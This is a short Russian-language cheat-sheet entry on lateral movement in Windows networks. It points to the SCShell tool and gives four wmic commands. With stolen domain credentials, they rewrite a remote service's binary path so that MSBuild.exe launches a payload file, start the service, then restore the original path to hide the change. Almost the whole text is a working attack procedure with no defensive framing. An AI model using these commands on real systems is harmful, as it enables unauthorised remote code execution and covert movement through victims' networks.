## Двигаемся боком

для этого есть прeкрасный [инструмент](https://github.com/SpiderLabs/SCShell)

Шаг 1: Получите текущее pathName вашей целевой службы, чтобы мы могли восстановить его после запуска нашей команды (в нашем случае XblAuthManager)

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' get pathName`

Шаг 2: Измените pathName на любую команду, которую вы хотите запустить

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml"`

Шаг 3: Запустите измененный сервис

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call startservice`

Шаг 4. Измените путь службы до ее первоначального значения.

`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs"`
